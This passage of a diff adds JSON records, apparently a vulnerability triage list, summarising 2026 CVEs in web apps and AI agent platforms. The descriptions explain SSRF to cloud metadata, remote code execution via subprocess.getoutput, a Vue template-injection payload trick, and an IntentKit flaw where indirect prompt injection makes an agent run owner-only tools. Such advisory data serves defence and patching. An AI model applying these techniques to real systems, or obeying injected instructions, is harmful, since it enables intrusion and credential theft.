attacker pre-sets `window.name` to a data-theft payload by sending the admin one redirect link first. The session cookie is `HttpOnly` and cannot be read via `document.cookie`; however, the XSRF token is readable and the attacker leverages same-origin execution to call admin APIs from inside the victim's browser, relaying the responses to an external server. No admin interaction beyond routine use is required. Version 4.4.2 contains a patch.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "code_execution"
+  ],
+  "priority": 30,
+  "product": "skills-service",
+  "published": "2026-09-09T19:17:28.400",
+  "references": [
+   "https://github.com/NationalSecurityAgency/skills-service/security/advisories/GHSA-hqfg-c8wf-w2g8"
+  ],
+  "vendor": "NationalSecurityAgency"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/craftcms/cms/security/advisories/GHSA-c55v-343g-5xff"
+  ],
+  "commit_refs": [],
+  "cpes": [],
+  "cve_id": "CVE-2026-55791",
+  "description": "Craft CMS is a content management system (CMS). Versions 4.0.0-RC1 and above, prior to 4.18.0 and 5.0.0-RC1, and above, prior to 5.10.0, are vulnerable to Server-Side Request Forgery (SSRF) and Arbitrary JavaScript Injection through the /actions/app/resource-js endpoint. By exploiting the default permissive trustedHosts configuration, an attacker can poison the Host or X-Forwarded-Host header to manipulate the application’s $baseUrl. This bypasses the endpoint’s internal URL validation, forcing the backend Guzzle client to fetch a malicious payload from an attacker-controlled server and reflect it to the client with a Content-Type: application/javascript header. The vulnerability manifests when assetManager.cacheSourcePaths is set to false. This issue has been fixed in versions 4.18.0 and 5.10.0.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "ssrf"
+  ],
+  "priority": 30,
+  "product": "cms",
+  "published": "2026-07-02T00:16:44.803",
+  "references": [
+   "https://github.com/craftcms/cms/pull/18559",
+   "https://github.com/craftcms/cms/security/advisories/GHSA-c55v-343g-5xff"
+  ],
+  "vendor": "craftcms"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/Significant-Gravitas/AutoGPT/security/advisories/GHSA-8qc5-rhmg-r6r6",
+   "https://github.com/Significant-Gravitas/AutoGPT/security/advisories/GHSA-8qc5-rhmg-r6r6"
+  ],
+  "commit_refs": [],
+  "cpes": [],
+  "cve_id": "CVE-2026-56663",
+  "description": "AutoGPT is a workflow automation platform for creating, deploying, and managing continuous artificial intelligence agents. Prior to 0.6.52, an authenticated user can bypass the SSRF / private-IP protections in SendWebRequestBlock and reach internal network services. _is_ip_blocked() in backend/backend/util/request.py does not normalize IPv4-mapped IPv6 addresses before checking resolved IPs against the blocked IPv4 ranges, and does not block special-use ranges such as 100.64.0.0/10 (CGNAT, RFC 6598). A hostname that resolves to an IPv4-mapped IPv6 address therefore passes validation and the request reaches the embedded internal IPv4 endpoint. This affects all AutoGPT Platform deployments. This vulnerability is fixed in 0.6.52.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "ssrf"
+  ],
+  "priority": 30,
+  "product": "AutoGPT",
+  "published": "2026-06-26T17:16:34.453",
+  "references": [
+   "https://github.com/Significant-Gravitas/AutoGPT/security/advisories/GHSA-8qc5-rhmg-r6r6"
+  ],
+  "vendor": "Significant-Gravitas"
+ },
+ {
+  "advisory_refs": [],
+  "commit_refs": [
+   "https://github.com/bigsk1/openai-realtime-ui/commit/54f8f50f43af97c334a881af7b021e84b5b8310f"
+  ],
+  "cpes": [],
+  "cve_id": "CVE-2026-5803",
+  "description": "A security flaw has been discovered in bigsk1 openai-realtime-ui up to 188ccde27fdf3d8fab8da81f3893468f53b2797c. The affected element is an unknown function of the file server.js of the component API Proxy Endpoint. Performing a manipulation of the argument Query results in server-side request forgery. The attack can be initiated remotely. The exploit has been released to the public and may be used for attacks. Continious delivery with rolling releases is used by this product. Therefore, no version details of affected nor updated releases are available. The patch is named 54f8f50f43af97c334a881af7b021e84b5b8310f. It is suggested to install a patch to address this issue.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "ssrf"
+  ],
+  "priority": 28,
+  "product": "openai-realtime-ui",
+  "published": "2026-04-08T21:17:01.977",
+  "references": [
+   "https://github.com/BruceJqs/public_exp/issues/3",
+   "https://github.com/bigsk1/openai-realtime-ui/",
+   "https://github.com/bigsk1/openai-realtime-ui/commit/54f8f50f43af97c334a881af7b021e84b5b8310f",
+   "https://github.com/bigsk1/openai-realtime-ui/issues/1",
+   "https://github.com/bigsk1/openai-realtime-ui/pull/2",
+   "https://vuldb.com/submit/786984",
+   "https://vuldb.com/vuln/356242",
+   "https://vuldb.com/vuln/356242/cti"
+  ],
+  "vendor": "bigsk1"
+ },
+ {
+  "advisory_refs": [],
+  "commit_refs": [
+   "https://github.com/nesquena/hermes-webui/commit/d257e5f36cfa9328600c8bde6f0de09a6ad9b6f4"
+  ],
+  "cpes": [],
+  "cve_id": "CVE-2026-58123",
+  "description": "Hermes WebUI before 0.51.788 contains an unauthenticated remote code execution vulnerability that allows remote attackers to execute arbitrary shell commands by accessing the embedded terminal API endpoints without credentials. Attackers can create a session, attach a PTY shell, and write arbitrary commands through the terminal input endpoint to achieve full command execution as the server process user via four sequential unauthenticated HTTP requests.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "code_execution"
+  ],
+  "priority": 28,
+  "product": "hermes-webui",
+  "published": "2026-07-09T22:17:09.517",
+  "references": [
+   "https://github.com/nesquena/hermes-webui/commit/d257e5f36cfa9328600c8bde6f0de09a6ad9b6f4",
+   "https://github.com/nesquena/hermes-webui/pull/5268",
+   "https://github.com/nesquena/hermes-webui/releases/tag/v0.51.788",
+   "https://www.vulncheck.com/advisories/hermes-webui-unauthenticated-rce-via-terminal-api"
+  ],
+  "vendor": "nesquena"
+ },
+ {
+  "advisory_refs": [],
+  "commit_refs": [
+   "https://github.com/neuml/txtai/commit/11b32da720f03276199ebc5583c15fc5d1ccafd3"
+  ],
+  "cpes": [],
+  "cve_id": "CVE-2026-58449",
+  "description": "txtai through 9.10.0, fixed in commit 11b32da, exposes an API /reindex endpoint whose function body parameter is resolved through txtai.util.Resolver, which performs __import__ and getattr on the caller-supplied dotted path with no allowlist. When the API is exposed with no TOKEN configured (authentication is opt-in, so all endpoints are unauthenticated) and the index is configured writable, a remote attacker can set function to an arbitrary callable such as subprocess.getoutput, achieving remote code execution as the server process during reindexing. Exploitation requires those deployment conditions (API exposed, no TOKEN, writable index); it is not the default configuration. The fix gates the endpoint behind a new reindex configuration flag.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "code_execution"
+  ],
+  "priority": 28,
+  "product": "txtai",
+  "published": "2026-06-30T22:16:58.397",
+  "references": [
+   "https://github.com/neuml/txtai/commit/11b32da720f03276199ebc5583c15fc5d1ccafd3",
+   "https://github.com/neuml/txtai/issues/1111",
+   "https://github.com/neuml/txtai/issues/1122",
+   "https://www.vulncheck.com/advisories/txtai-unauthenticated-remote-code-execution-via-unsafe-reflection-in-api-reindex-function-parameter"
+  ],
+  "vendor": "neuml"
+ },
+ {
+  "advisory_refs": [],
+  "commit_refs": [
+   "https://github.com/nocobase/nocobase/commit/5706fb48d9bbe190f9e0044c6d5c87fc5b68c7f1"
+  ],
+  "cpes": [],
+  "cve_id": "CVE-2026-58468",
+  "description": "NocoBase through 2.1.20 contains a server-side request forgery vulnerability in the serverRequest wrapper that allows authenticated administrators to issue arbitrary outbound HTTP requests by supplying malicious URLs to workflow request nodes, custom request action buttons, or the AI plugin. Attackers can target loopback addresses, RFC-1918 private ranges, and cloud instance metadata endpoints to perform internal network port enumeration, host discovery, and retrieval of IAM role credentials from the instance metadata service. v2.1.18 added a warning message for when SERVER_REQUEST_WHITELIST is not configured.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "ssrf"
+  ],
+  "priority": 28,
+  "product": "nocobase",
+  "published": "2026-07-07T20:16:29.240",
+  "references": [
+   "https://github.com/nocobase/nocobase/commit/5706fb48d9bbe190f9e0044c6d5c87fc5b68c7f1",
+   "https://github.com/nocobase/nocobase/issues/9962",
+   "https://github.com/nocobase/nocobase/pull/9966",
+   "https://www.vulncheck.com/advisories/nocobase-server-side-request-forgery-via-serverrequest-wrapper"
+  ],
+  "vendor": "nocobase"
+ },
+ {
+  "advisory_refs": [],
+  "commit_refs": [
+   "https://github.com/EstrellaXD/Auto_Bangumi/commit/487bdfec545e805ae416e6ddf28651bd274d6a73"
+  ],
+  "cpes": [],
+  "cve_id": "CVE-2026-59101",
+  "description": "AutoBangumi before 3.2.8 contains a server-side request forgery (SSRF) vulnerability that allows unauthenticated remote attackers to probe internal network services by supplying arbitrary host values to an unprotected setup endpoint. Attackers can send requests to the POST /api/v1/setup/test-downloader endpoint during the initial setup window, causing the server to issue HTTP GET requests to internal or reserved addresses and leak information through echoed connection-error messages.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "ssrf"
+  ],
+  "priority": 28,
+  "product": "Auto_Bangumi",
+  "published": "2026-07-02T20:17:08.507",
+  "references": [
+   "https://github.com/EstrellaXD/Auto_Bangumi/commit/487bdfec545e805ae416e6ddf28651bd274d6a73",
+   "https://github.com/EstrellaXD/Auto_Bangumi/issues/1041",
+   "https://github.com/EstrellaXD/Auto_Bangumi/releases/tag/3.2.8",
+   "https://www.vulncheck.com/advisories/autobangumi-ssrf-via-api-v1-setup-test-downloader"
+  ],
+  "vendor": "EstrellaXD"
+ },
+ {
+  "advisory_refs": [],
+  "commit_refs": [
+   "https://github.com/bagisto/bagisto/commit/49d0c3fc90dedf8782c45c5979df4f4595d6bb97"
+  ],
+  "cpes": [],
+  "cve_id": "CVE-2026-60120",
+  "description": "Bagisto before 2.4.4 contains a stored cross-site scripting vulnerability via client-side template injection that allows unauthenticated attackers to execute arbitrary JavaScript in administrator browsers by registering a customer account with malicious payload in the first or last name field. The create.blade.php template renders customer name fields without the Vue.js v-pre directive, causing Vue.js to evaluate stored template expressions as live JavaScript when an administrator opens the Create Order page for the affected customer.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "template_injection"
+  ],
+  "priority": 28,
+  "product": "Bagisto",
+  "published": "2026-07-09T21:16:56.410",
+  "references": [
+   "https://github.com/bagisto/bagisto/commit/49d0c3fc90dedf8782c45c5979df4f4595d6bb97",
+   "https://github.com/bagisto/bagisto/releases/tag/v2.4.4",
+   "https://www.vulncheck.com/advisories/bagisto-stored-xss-via-csti-in-create-blade-php"
+  ],
+  "vendor": "Webkul"
+ },
+ {
+  "advisory_refs": [],
+  "commit_refs": [
+   "https://github.com/SimpleMachines/SMF/commit/4bf35cf9e45573a5f55a6f52995086c1da89c096",
+   "https://github.com/SimpleMachines/SMF/commit/b4d23dfd74a511587c605f9d294cefc3a75b4b26"
+  ],
+  "cpes": [],
+  "cve_id": "CVE-2026-61520",
+  "description": "Simple Machines Forum 2.1 prior to commit b4d23df (fixed in 2.1.8) and 3.0 prior to commit 4bf35cf contains a server-side request forgery vulnerability in the image proxy that allows authenticated attackers to trigger internal HTTP requests by embedding attacker-controlled URLs in BBCode image tags, which the proxy fetches without validating resolved destination IPs against private address ranges, loopback, or link-local addresses. Attackers can leverage SMF's automatic HMAC signature generation for any embedded image URL to obtain valid signed proxy requests targeting internal services such as cloud instance metadata endpoints, internal web applications, and container network services.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "ssrf"
+  ],
+  "priority": 28,
+  "product": "SMF",
+  "published": "2026-07-14T21:17:06.290",
+  "references": [
+   "https://github.com/SimpleMachines/SMF/commit/4bf35cf9e45573a5f55a6f52995086c1da89c096",
+   "https://github.com/SimpleMachines/SMF/commit/b4d23dfd74a511587c605f9d294cefc3a75b4b26",
+   "https://www.vulncheck.com/advisories/simple-machines-forum-ssrf-via-image-proxy"
+  ],
+  "vendor": "SimpleMachines"
+ },
+ {
+  "advisory_refs": [],
+  "commit_refs": [
+   "https://github.com/codecentric/spring-boot-admin/commit/1f991ea013e46360b8f8fb63fe4ad20a9bf0d551"
+  ],
+  "cpes": [],
+  "cve_id": "CVE-2026-62242",
+  "description": "Spring Boot Admin Server before 4.1.2 contains a server-side request forgery vulnerability that allows unauthenticated attackers to register instances with attacker-controlled healthUrl and managementUrl parameters without validation against private IP ranges or metadata endpoints. Attackers can force the server to make HTTP requests to arbitrary internal addresses and retrieve response bodies via the actuator proxy to exfiltrate cloud credentials.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "ssrf"
+  ],
+  "priority": 28,
+  "product": "spring-boot-admin",
+  "published": "2026-07-13T22:16:52.260",
+  "references": [
+   "https://github.com/codecentric/spring-boot-admin/commit/1f991ea013e46360b8f8fb63fe4ad20a9bf0d551",
+   "https://github.com/codecentric/spring-boot-admin/issues/5452",
+   "https://github.com/codecentric/spring-boot-admin/pull/5464",
+   "https://github.com/codecentric/spring-boot-admin/releases/tag/4.1.2",
+   "https://www.vulncheck.com/advisories/spring-boot-admin-server-ssrf-via-unauthenticated-instance-registration"
+  ],
+  "vendor": "codecentric"
+ },
+ {
+  "advisory_refs": [],
+  "commit_refs": [
+   "https://github.com/medienbaecker/kirby-modules/commit/315417e4fa9f18682e4382c9f44c04bd0913ce96"
+  ],
+  "cpes": [],
+  "cve_id": "CVE-2026-63092",
+  "description": "kirby-modules through 5.5.7, fixed in commit 315417e, contains an information disclosure vulnerability that allows any authenticated Kirby Panel user to retrieve the full plaintext commercial license key by sending a GET request to the modules/activate dialog endpoint. The plugin's activate dialog handler in lib/areas.php returns the complete key via ModulesLicense::readKey() without performing an administrator check, as the dialog is gated only by the access.system permission which defaults to true for all non-admin roles, enabling attackers to use the disclosed key to activate the plugin on arbitrary third-party installations.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "information_disclosure"
+  ],
+  "priority": 28,
+  "product": "kirby-modules",
+  "published": "2026-07-21T21:16:52.703",
+  "references": [
+   "https://github.com/medienbaecker/kirby-modules/commit/315417e4fa9f18682e4382c9f44c04bd0913ce96",
+   "https://www.vulncheck.com/advisories/kirby-modules-license-key-disclosure-via-modules-activate-dialog"
+  ],
+  "vendor": "medienbaecker"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/geonetwork/core-geonetwork/security/advisories/GHSA-mh22-prqr-vf42"
+  ],
+  "commit_refs": [],
+  "cpes": [],
+  "cve_id": "CVE-2026-63219",
+  "description": "GeoNetwork is a catalog application to manage spatially referenced resources. Prior to versions 4.4.12 and 4.2.17, the API endpoint for creating a new formatter via file upload is unprotected and allows the upload of external uncontrolled files. An unauthenticated attacker can upload arbitrary `.xsl` or `.zip` formatter files to the server. An unauthenticated attacker can write arbitrary files into the GeoNetwork formatter directory. On its own this constitutes unauthorized write access to server storage. The issue is patched in GeoNetwork versions 4.4.12 and 4.2.17.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "file_read"
+  ],
+  "priority": 28,
+  "product": "core-geonetwork",
+  "published": "2026-09-03T18:17:22.997",
+  "references": [
+   "https://docs.geonetwork-opensource.org/4.2/overview/change-log/version-4.2.17",
+   "https://docs.geonetwork-opensource.org/4.4/overview/change-log/version-4.4.12",
+   "https://github.com/geonetwork/core-geonetwork/pull/9346",
+   "https://github.com/geonetwork/core-geonetwork/security/advisories/GHSA-mh22-prqr-vf42",
+   "https://thehackernews.com/2026/09/geonetwork-fixes-unauthenticated-rce.html"
+  ],
+  "vendor": "geonetwork"
+ },
+ {
+  "advisory_refs": [],
+  "commit_refs": [
+   "https://github.com/hyperdxio/hyperdx/commit/1705b37ac68acc222cd038327ed79e167e256a1b"
+  ],
+  "cpes": [],
+  "cve_id": "CVE-2026-63731",
+  "description": "HyperDX before 2.31.0 contains a server-side request forgery vulnerability that allows authenticated team members to direct the server to arbitrary internal destinations by supplying a caller-controlled host parameter to the ClickHouse proxy test endpoint with no URL validation or allowlist enforcement. Attackers can exploit the reflected error responses from the endpoint to disclose internal service response bodies, enabling access to internal APIs, container services, and cloud provider metadata endpoints.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "ssrf"
+  ],
+  "priority": 28,
+  "product": "hyperdx",
+  "published": "2026-07-20T19:17:29.360",
+  "references": [
+   "https://github.com/hyperdxio/hyperdx/commit/1705b37ac68acc222cd038327ed79e167e256a1b",
+   "https://github.com/hyperdxio/hyperdx/issues/2588",
+   "https://github.com/hyperdxio/hyperdx/pull/2593",
+   "https://github.com/hyperdxio/hyperdx/releases/tag/%40hyperdx%2Fapp%402.31.0",
+   "https://www.vulncheck.com/advisories/hyperdx-ssrf-via-clickhouse-proxy-test-endpoint"
+  ],
+  "vendor": "hyperdxio"
+ },
+ {
+  "advisory_refs": [],
+  "commit_refs": [
+   "https://github.com/feedbin/feedbin/commit/04b89b84189e4727ea19d84ea4a44015859b29cc"
+  ],
+  "cpes": [],
+  "cve_id": "CVE-2026-65319",
+  "description": "Feedbin (commit 739884a) contains an unauthenticated information disclosure vulnerability that allows unauthenticated attackers to retrieve private article content by sending requests to the entries text API endpoint, which skips the authorization before-action filter entirely. Attackers can iterate sequential integer entry IDs through the GET /api/v2/entries/:id/text endpoint to enumerate and extract plain-text content of all stored articles, including private newsletter content, personal page-saves, and articles from any user's private subscriptions.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "information_disclosure"
+  ],
+  "priority": 28,
+  "product": "Feedbin",
+  "published": "2026-07-21T22:19:10.630",
+  "references": [
+   "https://github.com/feedbin/feedbin",
+   "https://github.com/feedbin/feedbin/commit/04b89b84189e4727ea19d84ea4a44015859b29cc",
+   "https://github.com/geo-chen/oss/blob/main/feedbin.md",
+   "https://www.vulncheck.com/advisories/feedbin-unauthenticated-entry-content-disclosure-via-get-api-v2-entries-id-text"
+  ],
+  "vendor": "Feedbin"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-4fv7-8rr6-rf2w",
+   "https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-4fv7-8rr6-rf2w"
+  ],
+  "commit_refs": [],
+  "cpes": [],
+  "cve_id": "CVE-2026-66398",
+  "description": "phpMyFAQ before v4.1.6 contains a remote code execution vulnerability in the configuration API that allows authenticated administrators with CONFIGURATION_EDIT and ATTACHMENT_ADD privileges to write arbitrary PHP files by manipulating the upgrade.lastDownloadedPackage setting. Attackers can upload a malicious ZIP file as an attachment, point the updater configuration to its stored path, and extract it into the application root to achieve code execution as the web server user.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "code_execution"
+  ],
+  "priority": 30,
+  "product": "phpMyFAQ",
+  "published": "2026-07-27T16:18:12.493",
+  "references": [
+   "https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-4fv7-8rr6-rf2w",
+   "https://www.vulncheck.com/advisories/phpmyfaq-before-remote-code-execution-via-configuration-api"
+  ],
+  "vendor": "thorsten"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/better-auth/better-auth/security/advisories/GHSA-prpr-5gj3-qqhg"
+  ],
+  "commit_refs": [],
+  "cpes": [],
+  "cve_id": "CVE-2026-67328",
+  "description": "@better-auth/sso versions before 1.6.21 contain multiple authentication bypass vulnerabilities in SSO provider handling that allow attackers to sign in as arbitrary users. Attackers can exploit domain verification parsing mismatches, orphaned provider accounts, unbound SAML assertions, or reflected XSS on logout endpoints to gain unauthorized session access and account takeover.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "auth_bypass"
+  ],
+  "priority": 30,
+  "product": "sso",
+  "published": "2026-08-01T13:17:03.380",
+  "references": [
+   "https://github.com/better-auth/better-auth/security/advisories/GHSA-prpr-5gj3-qqhg",
+   "https://www.vulncheck.com/advisories/better-auth-sso-before-account-takeover-via-sso"
+  ],
+  "vendor": "better-auth"
+ },
+ {
+  "advisory_refs": [],
+  "commit_refs": [
+   "https://github.com/MISP/cti-transmute/commit/4f43c9181a00262bec2a6dfbc9ff9c50d534e918",
+   "https://github.com/MISP/cti-transmute/commit/522fa8ff8223b12a6128ea3fc2344a77b7b9108d",
+   "https://github.com/MISP/cti-transmute/commit/ad8bf2b8031491cefb552314ef7ff6f4148ca95a",
+   "https://github.com/MISP/cti-transmute/commit/ecfdaef63860a071c6f07afd30156ca77a77ad2b"
+  ],
+  "cpes": [],
+  "cve_id": "CVE-2026-71502",
+  "description": "CTI-Transmute contains a stored cross-site scripting vulnerability caused by insufficient neutralization of Vue template expression delimiters in server-rendered user-controlled data. An unauthenticated attacker can create a public conversion whose name or description contains a malicious Vue expression using the application's configured [[ ... ]] delimiters. User profile names may provide an additional injection vector. Although Jinja HTML escaping is applied, the resulting value is subsequently included in a DOM region compiled by Vue. Vue interprets the attacker-controlled value as a template expression rather than ordinary text. By accessing the JavaScript Function constructor from within the expression, an attacker can execute arbitrary JavaScript in the security context of the CTI-Transmute origin. The application's nonce-based Content Security Policy does not prevent exploitation because the Vue runtime compiler requires the unsafe-eval policy exception. The malicious payload is stored by the application and executed whenever another user opens an affected page, such as the public conversion detail page. The victim may be a normal user or an administrator. Successful exploitation could allow the attacker to: * Access data available to the victim through the application. * Extract API keys, tokens, or other sensitive information exposed to the page. * Perform authenticated actions using the victim's session. * Modify conversions or other application data. * Escalate the impact by targeting an administrator. A demonstrated payload can use [].constructor.constructor(...) to obtain the JavaScript Function constructor and execute arbitrary code. The regression tests also show that a short first-stage payload could retrieve an uncapped conversion description and evaluate a larger second-stage payload. The patch addresses the vulnerability by registering a global Jinja finalize hook that inserts a zero-width Unicode word joiner inside every Vue delimiter found in server-rendered values. This prevents Vue from recognizing the values as template expressions while preserving their visible representation.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "information_disclosure"
+  ],
+  "priority": 28,
+  "product": "cti-transmute",
+  "published": "2026-08-08T22:16:34.360",
+  "references": [
+   "https://github.com/MISP/cti-transmute/commit/4f43c9181a00262bec2a6dfbc9ff9c50d534e918",
+   "https://github.com/MISP/cti-transmute/commit/522fa8ff8223b12a6128ea3fc2344a77b7b9108d",
+   "https://github.com/MISP/cti-transmute/commit/ad8bf2b8031491cefb552314ef7ff6f4148ca95a",
+   "https://github.com/MISP/cti-transmute/commit/ecfdaef63860a071c6f07afd30156ca77a77ad2b"
+  ],
+  "vendor": "misp"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/n8n-io/n8n/security/advisories/GHSA-xmc9-4f2h-jf9c"
+  ],
+  "commit_refs": [],
+  "cpes": [
+   "cpe:2.3:a:n8n:n8n:*:*:*:*:*:node.js:*:*",
+   "cpe:2.3:a:n8n:n8n:2.32.0:*:*:*:*:node.js:*:*"
+  ],
+  "cve_id": "CVE-2026-72762",
+  "description": "n8n versions before 1.123.67, 2.31.5, and 2.32.1 contain an arbitrary file write vulnerability in the Edit Image node, which passes its output format parameter to the underlying image library without validation. An authenticated user able to run workflows can supply a crafted format value to write arbitrary files outside the node's working directory on the n8n instance.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "file_read"
+  ],
+  "priority": 28,
+  "product": "n8n",
+  "published": "2026-08-11T13:19:06.230",
+  "references": [
+   "https://github.com/n8n-io/n8n/security/advisories/GHSA-xmc9-4f2h-jf9c",
+   "https://www.vulncheck.com/advisories/n8n-before-arbitrary-file-write-via-edit-image-node"
+  ],
+  "vendor": "n8n-io"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/siyuan-note/siyuan/security/advisories/GHSA-mjf3-jwmf-r6wf"
+  ],
+  "commit_refs": [],
+  "cpes": [],
+  "cve_id": "CVE-2026-74800",
+  "description": "SiYuan before v3.7.4 fails to set Content-Disposition and X-Content-Type-Options headers when serving arbitrary file assets, allowing stored cross-site scripting attacks. Authenticated attackers can upload HTML files as assets and execute scripts with full kernel API access when the workspace owner opens the asset link.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "file_read"
+  ],
+  "priority": 28,
+  "product": "siyuan",
+  "published": "2026-08-17T11:16:40.187",
+  "references": [
+   "https://github.com/siyuan-note/siyuan/security/advisories/GHSA-mjf3-jwmf-r6wf",
+   "https://www.vulncheck.com/advisories/siyuan-before-stored-xss-via-assets-endpoint"
+  ],
+  "vendor": "siyuan-note"
+ },
+ {
+  "advisory_refs": [],
+  "commit_refs": [
+   "https://github.com/roundcube/roundcubemail/commit/62d33c8a0dc3fd0dd03984220dc9709e8e0de43b",
+   "https://github.com/roundcube/roundcubemail/commit/a2334990c02f7cb77b1a8d6fa97fcd9e1b5cd1fb"
+  ],
+  "cpes": [
+   "cpe:2.3:a:roundcube:webmail:*:*:*:*:*:*:*:*"
+  ],
+  "cve_id": "CVE-2026-74998",
+  "description": "In Roundcube Webmail before 1.6.18 and 1.7.x before 1.7.3, responses from the CSS (Cascading Style Sheets) proxy were not validated, which may result in information disclosure or XSS (cross-site scripting) via MIME sniffing.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "information_disclosure"
+  ],
+  "priority": 28,
+  "product": "Webmail",
+  "published": "2026-08-17T13:16:54.270",
+  "references": [
+   "https://github.com/roundcube/roundcubemail/commit/62d33c8a0dc3fd0dd03984220dc9709e8e0de43b",
+   "https://github.com/roundcube/roundcubemail/commit/a2334990c02f7cb77b1a8d6fa97fcd9e1b5cd1fb",
+   "https://github.com/roundcube/roundcubemail/releases/tag/1.6.18",
+   "https://github.com/roundcube/roundcubemail/releases/tag/1.7.3",
+   "https://roundcube.net/news/2026/08/09/security-updates-1.6.18-and-1.7.3"
+  ],
+  "vendor": "Roundcube"
+ },
+ {
+  "advisory_refs": [],
+  "commit_refs": [
+   "https://github.com/infiniflow/ragflow/commit/c4fe68eaa0bf1d6442d2cd6ac2e35bc9ccbed34f",
+   "https://github.com/infiniflow/ragflow/commit/e16d1a0150e1ca069beb538ae3dcd03f59edc5fa"
+  ],
+  "cpes": [],
+  "cve_id": "CVE-2026-75898",
+  "description": "RAGFlow before 0.26.3 contains a server-side request forgery vulnerability in the agent workflow \"Invoke\" component (agent/component/invoke.py). The component builds an outbound request URL from canvas configuration and runtime template variables and passes it to requests.get, requests.post, or requests.put without calling the shared assert_url_is_safe validator or pinning the resolved address, unlike the crawler, SearXNG, file-upload, and RSS fetch paths. A user who can create or trigger an agent can direct the server to fetch loopback, link-local, and RFC 1918 destinations, including cloud instance metadata endpoints and services co-located on the deployment network, and the response body is returned as the component output. Where an agent is configured to interpolate the chat query into the Invoke URL, the destination is chosen by whoever can send that query.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "ssrf"
+  ],
+  "priority": 28,
+  "product": "ragflow",
+  "published": "2026-08-18T15:17:15.367",
+  "references": [
+   "https://github.com/infiniflow/ragflow/blob/v0.26.2/agent/component/invoke.py#L168-L172",
+   "https://github.com/infiniflow/ragflow/commit/c4fe68eaa0bf1d6442d2cd6ac2e35bc9ccbed34f",
+   "https://github.com/infiniflow/ragflow/commit/e16d1a0150e1ca069beb538ae3dcd03f59edc5fa",
+   "https://github.com/infiniflow/ragflow/issues/15425",
+   "https://github.com/infiniflow/ragflow/issues/18280",
+   "https://github.com/infiniflow/ragflow/releases/tag/v0.26.3",
+   "https://www.vulncheck.com/advisories/ragflow-server-side-request-forgery-via-agent-invoke-component"
+  ],
+  "vendor": "infiniflow"
+ },
+ {
+  "advisory_refs": [],
+  "commit_refs": [
+   "https://github.com/crestalnetwork/intentkit/commit/5b91da5734d1ac16cd656fa66a86caf8f15cd671"
+  ],
+  "cpes": [],
+  "cve_id": "CVE-2026-76066",
+  "description": "IntentKit through 2.6.3, fixed in commit 5b91da5, contains an authorization bypass vulnerability where the executor validates tool calls against the full tool registry rather than the per-request narrowed tool advertisement enforced by ToolBindingMiddleware, allowing owner-only state-changing tools such as wallet transfer, posting, memory-write, and call-agent to execute without any human-in-the-loop or approval gate. An unauthenticated or public caller in WEB, API, TWITTER, or TELEGRAM contexts can exploit this by supplying the exact de-advertised tool name and arguments via indirect prompt injection or by replaying checkpoint and history data on a reused thread, achieving unauthorized execution of owner-restricted capabilities.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "auth_bypass"
+  ],
+  "priority": 28,
+  "product": "intentkit",
+  "published": "2026-10-15T02:20:15.603",
+  "references": [
+   "https://github.com/crestalnetwork/intentkit/commit/5b91da5734d1ac16cd656fa66a86caf8f15cd671",
